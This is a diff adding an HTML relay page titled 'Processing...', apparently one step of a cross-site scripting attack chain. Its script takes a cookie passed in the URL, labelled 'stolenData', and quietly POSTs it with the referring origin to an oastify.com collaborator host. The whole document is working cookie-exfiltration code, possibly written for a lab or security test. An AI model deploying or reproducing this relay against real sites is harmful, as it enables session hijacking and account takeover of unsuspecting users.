@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Processing...</title>
+</head>
+<body>
+    <script>
+        // 1. Get the 'data' parameter from the URL (the cookie)
+        const urlParams = new URLSearchParams(window.location.search);
+        const stolenData = urlParams.get('data');
+
+        if (stolenData) {
+            // 2. Use fetch to send it to Site C (Oastify)
+            // Since this is a standard JS script now, we can use fetch here
+            fetch('https://0hi6cy3kynspq39yalf9mxocq3wukk89.oastify.com', {
+                method: 'POST',
+                mode: 'no-cors', // Keeps it quiet
+                body: JSON.stringify({
+                    capturedCookie: stolenData,
+                    origin: document.referrer // Tells you where it came from
+                })
+            }).then(() => {
+                console.log("Data forwarded.");
+            });
+        }
+    </script>
+</body>
+</html>
